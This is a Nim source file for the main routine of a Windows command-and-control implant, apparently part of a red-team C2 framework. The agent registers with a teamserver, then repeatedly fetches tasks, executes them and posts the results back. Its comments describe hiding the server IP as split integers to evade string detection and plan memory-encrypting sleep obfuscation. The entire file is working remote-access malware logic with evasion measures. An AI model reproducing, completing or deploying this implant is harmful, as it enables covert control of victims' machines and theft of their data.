import strformat, os, times, random
import winim
import sugar

import ./agentTypes
import core/[task, packer, http, metadata]
import ../../common/[types, utils]

const ListenerUuid {.strdefine.}: string = ""
const Octet1 {.intdefine.}: int = 0
const Octet2 {.intdefine.}: int = 0
const Octet3 {.intdefine.}: int = 0
const Octet4 {.intdefine.}: int = 0
const ListenerPort {.intdefine.}: int = 5555
const SleepDelay {.intdefine.}: int = 10

proc main() = 
    randomize()

    #[
        The process is the following:
        1. Agent reads configuration file, which contains data relevant to the listener, such as IP, PORT, UUID and sleep settings
        2. Agent collects information relevant for the registration (using Windows API)
        3. Agent registers to the teamserver 
        4. Agent moves into an infinite loop, which is only exited when the agent is tasked to terminate
    ]#  

    # The agent configuration is read at compile time using define/-d statements in nim.cfg
    # This configuration file can be dynamically generated from the teamserver management interface
    # Downside to this is obviously that readable strings, such as the listener UUID can be found in the binary
    when not defined(ListenerUuid) or not defined(Octet1) or not defined(Octet2) or not defined(Octet3) or not defined(Octet4) or not defined(ListenerPort) or not defined(SleepDelay):
        echo "Missing agent configuration."
        quit(0)

    # Reconstruct IP address, which is split into integers to prevent it from showing up as a hardcoded-string in the binary
    let address = $Octet1 & "." & $Octet2 & "." & $Octet3 & "." & $Octet4 

    # Create agent configuration
    var config = AgentConfig(
        agentId: generateUUID(),
        listenerId: ListenerUuid,
        ip: address, 
        port: ListenerPort, 
        sleep: SleepDelay
    )

    # Create registration payload
    let registrationData: AgentRegistrationData = config.getRegistrationData()
    let registrationBytes = serializeRegistrationData(registrationData)

    config.register(registrationBytes)
    echo fmt"[+] [{config.agentId}] Agent registered."

    #[
        Agent routine: 
        1. Sleep Obfuscation
        2. Retrieve task from /tasks endpoint
        3. Execute task and post result to /results
        4. If additional tasks have been fetched, go to 2.
        5. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 

        # TODO: Replace with actual sleep obfuscation that encrypts agent memory
        sleep(config.sleep * 1000)

        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
        echo fmt"[{date}] Checking in."

        # Retrieve task queue for the current agent
        let packet: string = config.getTasks()

        if packet.len <= 0: 
            echo "No tasks to execute."
            continue

        let tasks: seq[Task] = deserializePacket(packet)
        
        if tasks.len <= 0: 
            echo "No tasks to execute."
            continue

        # Execute all retrieved tasks and return their output to the server
        for task in tasks: 
            let 
                result: TaskResult = config.handleTask(task)
                resultData: seq[byte] = serializeTaskResult(result)

            # echo resultData
            config.postResults(resultData)
            
when isMainModule: 
    main() 